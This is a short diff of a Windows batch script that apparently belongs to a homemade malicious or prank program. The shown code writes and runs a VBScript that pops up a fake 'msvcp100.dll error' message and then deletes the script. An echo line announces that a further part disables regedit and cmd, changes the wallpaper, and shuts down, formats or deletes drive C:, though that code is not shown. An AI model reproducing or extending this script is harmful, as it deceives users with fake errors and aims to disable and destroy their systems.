@@ -1,6 +1,6 @@
 echo MsgBox "msvcp100.dll error",17,"ERROR"> a.vbs
-del a.vbs
 a.vbs
+del a.vbs
 
 @echo off
 echo THIS PART WILL TURN OFF REGEDIT, CMD, CHANGE WALLPAPER, AND SHUTDOWN / FORMAT / DELETE C:
